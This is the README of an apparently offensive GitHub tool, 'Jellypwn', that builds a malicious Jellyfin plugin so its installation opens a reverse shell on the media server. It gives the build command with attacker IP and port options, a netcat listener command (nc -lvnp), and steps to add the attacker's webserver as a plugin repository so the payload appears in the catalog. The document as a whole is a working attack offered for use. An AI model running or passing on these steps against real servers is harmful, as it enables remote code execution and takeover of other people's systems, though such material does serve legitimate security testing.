# Jellypwn

Get a reverse-shell on jellyfin using plugins

<https://github.com/jellyfin/jellyfin-web/issues/4653>

**TDLR;** Jellyfin allows you (admin user) to upload plugins to the server, these plugins are just .zip files with a dll file inside it. You can upload a plugin that executes a reverse-shell on the server.

## PoC video

<!--![website2](https://github.com/ScribblerCoder/Jellypwn/assets/35840617/155316da-464b-4d46-873b-a167b54d166b)-->
<p align="center">
<img src="https://github.com/ScribblerCoder/Jellypwn/assets/35840617/155316da-464b-4d46-873b-a167b54d166b" width="800">
</p>
<br/>

## How to use

This repo builds the plugin and hosts it on a webserver, using microsoft's dotnet SDK docker image. You can build the plugin yourself if you have dotnet (don't forget to replace your own IP and listener Port).

```console
bash build.sh [-p LISTENPORT] [-l WEBPORT] [-i IP]
```

Then run a netcat listener on the port you specified

```console
nc -lvnp LISTENPORT
```

To install your plugin on jellyfin you need to add a reposiory to the plugin catalog, you can do this by going to the plugin catalog and clicking on the "Repositories" Tab. Then click on "+" button, add the url of the webserver where you are hosting the plugin. Then your plugin should appear in the catalog for installation.
